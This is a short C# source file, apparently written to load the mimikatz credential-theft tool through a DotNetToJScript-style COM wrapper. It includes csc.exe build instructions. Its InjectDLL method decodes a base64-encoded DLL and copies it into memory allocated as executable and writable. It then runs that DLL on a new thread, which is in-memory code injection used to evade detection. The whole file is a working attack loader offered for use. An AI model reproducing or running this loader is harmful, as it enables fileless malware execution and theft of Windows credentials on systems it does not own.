using System;
using System.Runtime.InteropServices;

// Build instructions:
// C:\Windows\Microsoft.Net\Framework\v2.0.50727\csc.exe /target:library mimikatz_dotnet2js.cs

[ComVisible(true)]
public class TestClass
{
    public TestClass()
    {
    }

    public void InjectDLL(string dllBase64, string param, int offset)
    {
        byte[] dll = Convert.FromBase64String(dllBase64);

        IntPtr mem = VirtualAlloc(IntPtr.Zero, dll.Length, 0x1000, 0x40);

        Marshal.Copy(dll, 0, mem, dll.Length);

        IntPtr startLoc = new IntPtr(mem.ToInt64() + offset);

        uint id = 0;
        IntPtr pParam = Marshal.StringToHGlobalUni(param);

        IntPtr handle = CreateThread(IntPtr.Zero, 0, startLoc, pParam, 0, out id);
        WaitForSingleObject(handle, 0xffffffff);

    }

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);   

    [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}


